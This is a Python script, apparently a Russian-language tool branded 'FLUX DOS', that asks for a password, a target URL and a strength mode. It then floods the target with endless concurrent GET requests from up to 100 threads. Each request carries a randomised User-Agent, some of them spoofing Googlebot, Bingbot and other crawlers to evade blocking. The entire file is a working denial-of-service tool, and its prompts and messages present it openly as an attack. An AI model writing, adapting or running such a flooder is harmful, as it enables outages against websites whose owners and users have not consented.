import random
import requests
import colorama
import concurrent.futures

colorama.init(autoreset=True)

print(f"""
{colorama.Fore.YELLOW}
███████╗██╗░░░░░██╗░░░██╗██╗░░██╗  ██████╗░░█████╗░░██████╗
██╔════╝██║░░░░░██║░░░██║╚██╗██╔╝  ██╔══██╗██╔══██╗██╔════╝
{colorama.Fore.MAGENTA}█████╗░░██║░░░░░██║░░░██║░╚███╔╝░  ██║░░██║██║░░██║╚█████╗░
██╔══╝░░██║░░░░░██║░░░██║░██╔██╗░  ██║░░██║██║░░██║░╚═══██╗
{colorama.Fore.RED}██║░░░░░███████╗╚██████╔╝██╔╝╚██╗  ██████╔╝╚█████╔╝██████╔╝
╚═╝░░░░░╚══════╝░╚═════╝░╚═╝░░╚═╝  ╚═════╝░░╚════╝░╚═════╝░
""")

def dos1():
    try:
        def generate_user_agent():
            versions = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/{0}.0; rv:{0}.0) like Gecko",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS {0}_{1} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/{2}.0 Mobile/14E5239e Safari/602.1",
                "Mozilla/5.0 (iPad; CPU OS {0}_{1} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/{2}.0 Mobile/14E5239e Safari/602.1",
                "Opera/{0}.80 (Windows NT 10.0; Win64; x64) Presto/2.12.{1} Version/{0}.80",
                "Mozilla/5.0 (Linux; Android {0}.{1}; SM-G950F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
                "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:{0}.0) Gecko/{0}.0 Firefox/{0}.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{0}.0) Gecko/{0}.0 Firefox/{0}.0",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 5 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/601.1 (KHTML, like Gecko) Version/{2}.0 Safari/601.1",
                "Mozilla/5.0 (Windows; U; Windows NT {0}.0; en-US; rv:{1}.0) Gecko/{2} Firefox/{1}.0",
                "Mozilla/5.0 (compatible; MSIE {0}.0; Windows NT {1}.1; Trident/{2}.0)",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/{2}.0 Safari/603.3.8",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/{0}.0; rv:{0}.0) like Gecko",
                "Mozilla/5.0 (iPad; CPU OS {0}_{1} like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/{2}.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/535.1",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/535.19"
            ]
            version = random.randint(60, 90)
            year = random.randint(10, 21)
            month = random.randint(1, 12)
            sub_version = random.randint(100, 999)
            sub_sub_version = random.randint(1, 9999)
            user_agent = random.choice(versions).format(version, year, sub_version, month, sub_sub_version)
            return user_agent

        def make_request(url):
            headers = {
                'User-Agent': generate_user_agent()
            }
            try:
                response = requests.get(url, headers=headers)
                print(
                    f"\n{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}+{colorama.Fore.YELLOW}]{colorama.Fore.MAGENTA} Атака началась, состояние сайта: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(
                    f"{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}-{colorama.Fore.YELLOW}]{colorama.Fore.RED} Ошибка при запросе: {e}")

        def dos():
            paswd = input(f"{colorama.Fore.YELLOW}[?]{colorama.Fore.MAGENTA}Введите пароль: ")
            if paswd == "flux":
                url = input(
                   f"{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}?{colorama.Fore.YELLOW}]{colorama.Fore.MAGENTA} Введите цель: ")
                power = input(
                    f"{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}?{colorama.Fore.YELLOW}]{colorama.Fore.MAGENTA} Выберите режим (1 - Слабый/2 - Средний/3 - Мощный): ")
            else:
                print(f"{colorama.Fore.MAGENTA}[?]{colorama.Fore.RED}Пароль неверен, повторите попытку позже")
                exit()
            # Проверка на корректный ввод режима
            if power not in ("1", "2", "3"):
                print(
                    f"{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}-{colorama.Fore.YELLOW}]{colorama.Fore.RED} Некорректный выбор режима, будет выбран режим по умолчанию (Слабый).")
                power = "1"

            max_workers = {
                "1": 30,
                "2": 60,
                "3": 100
            }[power]

            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                while True:
                    executor.submit(make_request, url)

        dos()
    except KeyboardInterrupt:
        print(
            f"\n{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}-{colorama.Fore.YELLOW}]{colorama.Fore.RED} Атака остановлена пользователем.")
    except Exception as e:
        print(
            f"{colorama.Fore.YELLOW}[{colorama.Fore.WHITE}-{colorama.Fore.YELLOW}]{colorama.Fore.RED} Произошла ошибка: {e}")


dos1()